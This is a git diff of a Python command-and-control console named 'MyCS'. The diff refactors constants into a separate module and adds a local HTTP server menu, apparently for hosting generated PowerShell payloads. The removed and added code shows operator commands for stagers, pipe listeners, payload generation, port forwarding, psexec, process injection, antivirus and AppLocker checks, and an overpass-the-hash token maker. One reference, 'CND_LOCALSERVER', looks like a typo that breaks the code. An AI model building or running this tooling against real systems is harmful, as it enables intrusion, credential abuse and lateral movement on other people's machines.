@@ -6,6 +6,8 @@ import uuid
 import os
 import time
 import payloadgen
+from myconstant import myconstant_networking,myconstant,mybuildin_cmd
+from localhttpserver import localhttpserver
 
 import win32pipe, win32file, pywintypes
 
@@ -32,120 +34,6 @@ def removecomplete():
 class SocketShutdown(Exception):
     pass
 
-
-
-class myconstant():
-    def __init__(self):
-
-        self.SOCKET_TIMEOUT = 5
-        self.PFW_ACK_SPEED = 2
-
-        self.TAG_MYCS = "[MYCS]"
-        self.TAG_LISTENER = "[Listener]"
-        #self.TAG_STAGER = "[Stager]"
-        self.TAG_INTE_STAGER = "[Interact]"
-        self.TAG_PIPE_LISTENER = "[Pipe Listener]"
-        self.TAG_PIPE_INTE_STAGER = "[Pipe Interact]"
-        self.TAG_PAYLOAD = "[Payload]"
-        self.TAG_STAGER_TOOLS = "[Tools]"
-
-
-        self.CMD_USELISTENER = "uselistener"
-        #self.CMD_USESTAGER = "userstager"
-        self.CMD_INTERACTSTAGER = "stager"
-        self.CMD_PIPE_INTERACTSTAGER = "pstager"
-        self.CMD_USEPIPELISTENER = "usepipelistener"
-        self.CMD_PAYLOAD = "payload"
-        self.CMD_HELP = "help"
-        self.CMD_EXIT = "exit"
-        self.CMD_AUTOLIST = [self.CMD_USEPIPELISTENER,self.CMD_USELISTENER,self.CMD_INTERACTSTAGER,self.CMD_HELP,self.CMD_EXIT,self.CMD_PIPE_INTERACTSTAGER,self.CMD_PAYLOAD]
-
-        self.CMD_BACK = "back"
-        self.CMD_LISTENER_GETINFO = "info"
-        self.CMD_LISTENER_SETHOSTNAME = "sethost"
-        self.CMD_LISTENER_SETPORT = "setport"
-        self.CMD_LISTENER_START = "start"
-        self.CMD_LISTENER_LIST = "list"
-        self.CMD_LISTENER_STOP = "stop"
-        self.CMD_LISTENER_AUTOLIST = [self.CMD_BACK,self.CMD_LISTENER_GETINFO,self.CMD_LISTENER_SETHOSTNAME,
-                                    self.CMD_LISTENER_SETPORT,self.CMD_LISTENER_START,self.CMD_LISTENER_LIST,self.CMD_LISTENER_STOP,self.CMD_HELP]
-
-        self.CMD_STAGER_GET_LIST = "list"
-        self.CMD_STAGER_GET_RUNNING_LIST = "rlist"
-        self.CMD_STAGER_GET_INTO = "into"
-        self.CMD_STAGER_GET_HISTORY = "history"
-        self.CMD_STAGER_LOAD_PS = "psload"
-        self.CMD_STAGER_CON = "connect"
-        self.CMD_STAGER_PFW = "pfw"
-        self.CMD_STAGER_BUILDIN = "tools"
-        #self.CMD_STAGER_GET_UNSEEN_HISTORY = "uhistory"
-        self.CMD_STAGER_AUTOLIST = [self.CMD_BACK,self.CMD_STAGER_GET_LIST,self.CMD_STAGER_GET_RUNNING_LIST,self.CMD_STAGER_GET_INTO,
-                                        self.CMD_STAGER_GET_HISTORY,self.CMD_HELP,self.CMD_STAGER_LOAD_PS,self.CMD_STAGER_CON,self.CMD_STAGER_PFW,self.CMD_STAGER_BUILDIN]
-
-        self.CMD_STAGER_TOOLS_PSEXEC = "psexec"
-        self.CMD_STAGER_TOOLS_IF64BIT = "if64"
-        self.CMD_STAGER_TOOLS_GETNETVERSION = "getnet"
-        self.CMD_STAGER_TOOLS_GETAV = "getav"
-        self.CMD_STAGER_TOOLS_GETAL = "getal"
-        self.CMD_STAGER_TOOLS_GETCLM = "getclm"
-        self.CMD_STAGER_TOOLS_MAKETOKEN = "maketoken"
-        self.CMD_STAGER_TOOLS_PSRESET = "psreset"
-        self.CMD_STAGER_TOOLS_INJECT = "inject"
-        
-        self.CMD_STAGER_TOOLS_AUTOLIST = [self.CMD_BACK,self.CMD_STAGER_TOOLS_PSEXEC,self.CMD_STAGER_TOOLS_IF64BIT,
-                                            self.CMD_STAGER_TOOLS_GETNETVERSION,self.CMD_STAGER_TOOLS_GETAV,self.CMD_STAGER_TOOLS_GETAL,
-                                            self.CMD_STAGER_TOOLS_GETCLM,self.CMD_STAGER_TOOLS_MAKETOKEN,self.CMD_STAGER_TOOLS_PSRESET,self.CMD_STAGER_TOOLS_INJECT]
-
-        self.CMD_PIPE_LISTENER_GETINFO = "info"
-        self.CMD_PIPE_LISTENER_SETPIPENAME = "setpipename"
-        self.CMD_PIPE_LISTENER_START = "start"
-        self.CMD_PIPE_LISTENER_LIST = "list"
-        self.CMD_PIPE_LISTENER_STOP = "stop"
-        self.CMD_PIPE_LISTENER_AUTOLIST = [self.CMD_PIPE_LISTENER_GETINFO,self.CMD_PIPE_LISTENER_SETPIPENAME,self.CMD_PIPE_LISTENER_START,
-                                            self.CMD_PIPE_LISTENER_LIST,self.CMD_PIPE_LISTENER_STOP,self.CMD_BACK]
-        
-        self.CMD_PIPE_STAGER_GET_LIST = "list"
-        self.CMD_PIPE_STAGER_GET_RUNNING_LIST = "rlist"
-        self.CMD_PIPE_STAGER_GET_INTO = "into"
-        self.CMD_PIPE_STAGER_GET_HISTORY = "history"
-        self.CMD_PIPE_STAGER_CON = "connect"
-        self.CMD_PIPE_SAGER_AUTOLIST = [self.CMD_PIPE_STAGER_GET_LIST,self.CMD_PIPE_STAGER_GET_INTO,self.CMD_PIPE_STAGER_GET_HISTORY,
-                                            self.CMD_BACK,self.CMD_PIPE_STAGER_GET_RUNNING_LIST,self.CMD_PIPE_STAGER_CON]
-        #self.CMD_PIPE_STAGER_LOAD_PS = "psload"
-        #self.CMD_PIPE_STAGER_CON = "connect" 
-
-        self.CMD_PAYLOAD_SETCONFIG = "setconfig"
-        self.CMD_PAYLOAD_GEN = "start"
-        self.CMD_PAYLOAD_INFO = "info"
-        self.CMD_PAYLOAD_AUTOLIST = [self.CMD_PAYLOAD_SETCONFIG,self.CMD_PAYLOAD_GEN,self.CMD_PAYLOAD_INFO,self.CMD_BACK]
-
-
-
-
-class myconstant_networking(): #applicaiton layer tag
-    def __init__(self):
-        self.PSRUN_SUCCESS = "PSRUN_SUCCESS"
-        self.PSRESET = "PSRESET_SUCCESS"
-        self.PIPE_CONNECTED = "PIPE_CONNECTED"
-        self.FW_NOTREADY = "FW_NOTREADY"
-        self.FW_SUCCESS = "FW_SUCCESS" #for remote startup
-        self.FW_LOCAL_SUCCESS = "FW_LOCAL_SUCCESS" #for local startup
-        self.FW_LOCAL_ERROR = "FW_LOCAL_ERROR" #for local startup
-        
-
-
-
-class mybuildin_cmd():
-    def __init__(self):
-        self.IF64BIT = "[Environment]::Is64BitProcess"
-        self.GETNETVERSION = "get-childitem -path \"HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\""
-        self.GETDEFENDER = "Get-MpComputerStatus"
-        self.GETAPPLOCKER = "Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections"
-        self.GETLANGMODE = "$ExecutionContext.SessionState.LanguageMode"
-
-        #overpassthehash
-        self.OPH_INIT = "$token = [SharPsplOit.Credentials.Tokens]::new()"
-        self.OPH_NEWTOKEN = "$token.MakeToken(\"{}\",\"{}\",\"{}\")"
 
 
 
@@ -254,6 +142,7 @@ class mysocket_handler():
                 return self.__msg_buf
 
 
+
 class myserver():
 
     def __init__(self):
@@ -296,7 +185,7 @@ class myserver():
         self.__mypipe_myuuid_list = list()
         self.__mypipe_mystart_list = dict() #bool
 
-    def get_resource_handler_result(self,myuuid):
+    def get_resource_handler_result(self,myuuid): #for pfw
         local_item_que_fromrh = self.__myfwdata_list_fromrh[myuuid]
 
         while True:
@@ -310,7 +199,7 @@ class myserver():
         return msg_item
 
 
-    def start_resource_handler(self,myuuid,conhost,conport): #its possible to have its own uuid
+    def start_resource_handler(self,myuuid,conhost,conport): # fow pfw #its possible to have its own uuid
         local_item_que_fromrh = self.__myfwdata_list_fromrh[myuuid]
         local_item_que_torh = self.__myfwdata_list_torh[myuuid]
 
@@ -840,6 +729,8 @@ class myserver():
     def print_psloadlist(self,myuuid):
         print("List of loaded script: {}".format(self.__mypsloader_list[myuuid]))
 
+    def clean_psloadlist(self,myuuid):
+        self.__mypsloader_list[myuuid] = list()
 
 #to hold some config for payloadgen
 class mypayload():
@@ -869,6 +760,7 @@ class mymainclass():
         self.__t_net_constant = myconstant_networking()
         self.__t_mypayload = mypayload()
         self.__t_mybuildin = mybuildin_cmd()
+        self.__t_localhttpserver = localhttpserver()
 
     def __cmd_list_main(self):
         print("\n+++++++++++++++++++++++++++++++++++")
@@ -937,6 +829,8 @@ class mymainclass():
                 setautocomplete(self.__t_myconstant.CMD_PAYLOAD_AUTOLIST)
             if cmd_tag == self.__t_myconstant.TAG_STAGER_TOOLS:
                 setautocomplete(self.__t_myconstant.CMD_STAGER_TOOLS_AUTOLIST)
+            if cmd_tag == self.__t_myconstant.TAG_LOCALSERVER:
+                setautocomplete(self.__t_myconstant.CMD_LOCALSERVER_AUTOLIST)
             
 
             user_input = input(cmd_tag + "> ")
@@ -964,7 +858,11 @@ class mymainclass():
                 if command_id == self.__t_myconstant.CMD_PAYLOAD:
                     cmd_tag = self.__t_myconstant.TAG_PAYLOAD
                     continue
-                
+
+                if command_id == self.__t_myconstant.CND_LOCALSERVER:
+                    cmd_tag = self.__t_myconstant.TAG_LOCALSERVER
+                    continue
+
                 # main menu
                 if command_id == self.__t_myconstant.CMD_EXIT:
                     print("Thanks for using MyCS..")
@@ -1266,6 +1164,7 @@ class mymainclass():
                         print("Please input a valid stager uuid")
                         continue
                     self.__t_myserver.create_command(user_input_stager,"psreset","dummy")
+                    self.__t_myserver.clean_psloadlist(user_input_stager)
                 
                 if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_INJECT:
                     
@@ -1428,6 +1327,38 @@ class mymainclass():
                     else:
                         t_mypayloadgen.set_config(self.__t_mypayload.payloadtype,self.__t_mypayload.ifreverse,self.__t_mypayload.namepipehost,self.__t_mypayload.namepipe)
                     t_mypayloadgen.gen_ps1()
+
+            if cmd_tag == self.__t_myconstant.TAG_LOCALSERVER:
+                if command_id == self.__t_myconstant.CMD_BACK:
+                    cmd_tag = self.__t_myconstant.TAG_MYCS
+                    continue
+                if command_id == self.__t_myconstant.CMD_LOCALSERVER_LIST:
+                    self.__t_localhttpserver.print_running_list()
+                    continue
+                if command_id == self.__t_myconstant.CMD_LOCALSERVER_GETINFO:
+                    self.__t_localhttpserver.print_server_config()
+                    continue
+                if command_id == self.__t_myconstant.CMD_LOCALSERVER_SETCONFIG:
+                    user_input_ip = input("Please enter the listener ip: ")
+                    user_input_port = input("Please enter the listener port: ")
+                    user_input_path = input("Please enter the server path: ")
+                    user_input_confirm = input("y to continue: ")
+                    if user_input_confirm != "y":
+                        continue
+                    self.__t_localhttpserver.set_server_config(user_input_ip,user_input_port,user_input_path)
+                    continue
+                if command_id == self.__t_myconstant.CMD_LOCALSERVER_START:
+                    self.__t_localhttpserver.start_resource_handler_http_server()
+                if command_id == self.__t_myconstant.CMD_LOCALSERVER_STOP:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_localhttpserver.get_running_list())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_localhttpserver.get_running_list():
+                        print("Please input a valid stager uuid")
+                        continue
+                    self.__t_localhttpserver.stop_resource_handler_http_server(user_input_stager)
+                    continue
 
 
 if __name__ == "__main__":
